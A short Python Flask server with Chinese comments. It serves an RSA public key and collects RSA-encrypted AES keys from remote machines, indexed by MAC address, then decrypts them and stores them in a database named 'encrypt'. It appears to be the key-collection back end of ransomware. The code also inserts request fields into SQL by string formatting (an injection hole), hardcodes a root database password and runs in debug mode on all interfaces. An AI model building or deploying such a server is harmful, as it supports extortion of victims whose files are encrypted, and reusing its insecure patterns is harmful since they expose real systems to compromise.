from flask import Flask, request,make_response
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization,hashes
import base64
# 生成RSA密钥对

import db_config
db_config.db_reset()
import pymysql
app = Flask(__name__)
#db_config.db_reset()
#con = db_config.connection

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)

private_key_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
# print("私钥")
# print(private_key_pem.decode())

public_key = private_key.public_key()
public_key_str = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

def inset_data(mac,key):
    db = pymysql.connect(host='127.0.0.1',
                         user='root',
                         password='123456',
                         database='encrypt')

    # 使用 cursor() 方法创建一个游标对象 cursor
    cursor = db.cursor()
    sql = "INSERT INTO KeyInfo(computer_info,keyinfo) \
           VALUES ('%s', '%s')" % \
          (mac, key)
    cursor.execute("use encrypt")
    try:
        # 执行sql语句
        cursor.execute(sql)
        # 提交到数据库执行
        db.commit()
    except Exception as e:
        # 如果发生错误则回滚
        db.rollback()
        print(f"执行失败 {e}")

    # 关闭数据库连接
    db.close()

def RSA_Decrypt(data):
#    print(data)
#    print("秘钥长度"+private_key)
    decrypted_text = private_key.decrypt(
        data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    print(decrypted_text)
    return decrypted_text

@app.route('/api', methods=['POST'])
def receive_data():
    ip_address = request.remote_addr
    mac = request.form.get('mac')
    key = request.form.get('key')
    key = base64.urlsafe_b64decode(key)
    aeskey = RSA_Decrypt(key)
    try:
        inset_data(mac,aeskey.decode())
        print("[!] 收到 {}  发送的秘钥 {})".format(ip_address,key))
        return "Data insertion successful"
    except:
        return "Data insertion failed"

@app.route('/getkey',methods=['GET'])
def get_key():
    return public_key_str

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
